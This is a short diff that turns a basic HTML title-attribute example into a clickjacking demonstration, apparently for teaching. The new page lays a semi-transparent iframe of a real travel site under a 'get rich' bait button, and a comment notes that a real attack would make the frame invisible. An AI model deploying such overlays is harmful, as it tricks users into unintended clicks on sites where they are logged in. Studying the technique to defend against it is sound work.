@@ -1,10 +1,19 @@
-<!DOCTYPE html>
-<html>
-<body>
+<style>
+iframe { /* iframe from the victim site */
+  width: 400px;
+  height: 100px;
+  position: absolute;
+  top:0; left:-20px;
+  opacity: 0.5; /* in real opacity:0 */
+  z-index: 1;
+}
+</style>
 
-<h2 title="I'm a header">The title Attribute</h2>
+<div>Click to get rich now:</div>
 
-<p title="I'm a tooltip">Mouse over this paragraph, to display the title attribute as a tooltip.</p>
+<!-- The url from the victim site -->
+<iframe src="www.tripadvisor.in"></iframe>
 
-</body>
-</html>
+<button>Click here!</button>
+
+<div>...And you're cool (I'm a cool hacker actually)!</div>
